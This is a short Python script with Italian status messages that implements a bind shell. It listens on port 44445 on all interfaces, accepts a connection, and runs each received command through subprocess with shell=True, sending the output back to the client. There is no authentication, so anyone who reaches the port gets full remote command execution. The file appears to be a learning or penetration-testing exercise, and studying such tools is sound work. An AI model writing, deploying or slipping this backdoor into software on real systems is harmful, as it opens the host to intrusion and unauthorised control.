import socket, os, subprocess

SRV_ADDR = ""
SRV_PORT = 44445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
print("Sono in ascolto...")
connection, address = s.accept()
print(f"La connessione da {address[0]} sulla porta {address[1]}")
while 1:
    path = os.getcwd() + "$ "
    connection.sendall(path.encode())
    data = connection.recv(1024)
    if not data: break
    command = data.decode('utf-8').strip()
    if command == 'exit':
        break
    elif command[:3] == 'cd ':
        os.chdir(command[3:])
    else:
        execute = subprocess.Popen(command, 
                                   shell=True, 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read() + "\n".encode()
        connection.sendall(result)
connection.close()